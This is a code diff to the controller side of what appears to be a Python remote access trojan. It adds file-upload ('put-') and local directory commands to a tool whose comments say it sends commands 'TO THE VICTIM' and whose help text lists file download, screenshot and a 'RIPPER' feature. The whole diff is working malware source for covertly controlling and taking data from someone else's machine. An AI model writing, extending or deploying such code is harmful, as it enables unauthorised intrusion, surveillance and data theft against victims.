@@ -49,7 +49,36 @@ def recvLen():
                 return int(decoded.split("-")[1])
         except Exception as f:
             print(f)
+
+def sendBytes(bytesToSend):
+    global conn
+    if conn != None:
+        conn.sendall(bytesToSend)            
             
+def sendLen(dat):
+    l = len(dat)
+    send("len-" + str(l) + "-")
+
+def readFile(path,asBytes):
+    try:
+        operation = "r"
+        if asBytes:
+            operation += "b"
+        with open(path,operation) as f:
+            return f.read()
+    except Exception as e:
+        print(f"ERROR: {e}")      
+# DIRECTORY MOVEMENT AT EJECUTION TIME            
+
+def currentDir():
+    return os.getcwd()
+
+def changeCurrentPath(newPath):
+    try:
+        os.chdir(newPath)
+    except Exception as e:
+        print(f"ERROR: {e}")      
+
 
 def recvFiles(filename, extension):
     global conn, stop
@@ -150,6 +179,18 @@ def filterCommand(command):
             send(command)
         else:
             print("RIPPER ABORTED ")
+    elif "local cd-" in command:
+        changeCurrentPath(command.split("-")[1])
+    elif command == "local pwd":
+        print(currentDir())
+    # SEND FILES
+    elif "put-" in command:
+        stop = True
+        send(command)
+        data = readFile(command.split("-")[1],True)
+        sendLen(data)
+        sendBytes(data)
+        stop = False
     else:  
         # SEND THE COMMAND TO THE VICTIM    
         send(command)
@@ -163,7 +204,14 @@ def helpPrinter():
     > DIRECTORY MOVEMENT (LINUX AND WINDOWS)
         - cd path
         - pwd (gets the current path)
-    
+
+    > LOCAL DIRECTORY MOVEMENT
+        - local cd-path
+        - local pwd
+           
+    > FILES
+        - download-file.txt
+        - put-file.txt
     > INFO
         - screenshot
         - status
